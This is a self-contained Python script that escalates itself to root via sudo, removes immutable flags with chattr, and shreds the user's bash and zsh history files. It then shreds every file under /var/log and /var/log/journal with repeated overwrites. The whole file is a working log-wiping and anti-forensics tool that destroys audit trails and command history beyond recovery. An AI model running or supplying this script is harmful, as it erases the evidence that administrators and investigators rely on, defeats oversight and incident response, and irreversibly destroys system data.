import os
import sys
from pathlib import Path
import subprocess
import pwd

def try_shred(file_path):
    subprocess.run(['chattr', '-i', file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = subprocess.run(['shred', '-u', '-z', '-n', '10', file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        print(f"Failed to shred {file_path}: {result.stderr.decode().strip()}")
    else:
        print(f"Shredded: {file_path}")

def main():
    if os.geteuid() != 0:
        os.execvp('sudo', ['sudo', sys.executable] + sys.argv)

    # Get the original user's home directory
    sudo_user = os.environ.get('SUDO_USER')
    if sudo_user:
        home_dir = pwd.getpwnam(sudo_user).pw_dir
    else:
        home_dir = str(Path.home())

    history_files = [
        os.path.join(home_dir, '.bash_history'),
        os.path.join(home_dir, '.zsh_history')
    ]

    for hist_file in history_files:
        if os.path.exists(hist_file):
            try_shred(hist_file)
        else:
            print(f"Not found: {hist_file}")

    log_dirs = ['/var/log', '/var/log/journal']
    for log_dir in log_dirs:
        for root, dirs, files in os.walk(log_dir):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    try_shred(file_path)

if __name__ == "__main__":
    main()